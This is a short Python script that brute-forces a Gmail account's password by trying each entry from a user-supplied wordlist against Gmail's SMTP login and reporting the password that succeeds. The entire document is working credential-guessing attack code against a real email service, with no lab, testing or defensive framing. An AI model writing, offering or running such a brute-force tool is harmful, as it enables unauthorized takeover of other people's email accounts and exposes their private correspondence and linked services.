import smtplib, ssl

wordlist = input("Wordlist? ")
sender_email = input("Email id? ")

try:
    passwords = open(wordlist, 'r').readlines()
except:
    print("Given wordlist does not exist.")
    exit()

sslcontext = ssl.create_default_context()

for password in passwords:
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=sslcontext) as server:
                password = str(password).replace("\n", "")
                server.login(sender_email, password)
                print("SUCCESS! Password = " + password)
                break
    except smtplib.SMTPAuthenticationError:
        print(password + " FAILED")
    except:
        print("You've lost internet connection or an unknown error has occurred.")
        exit()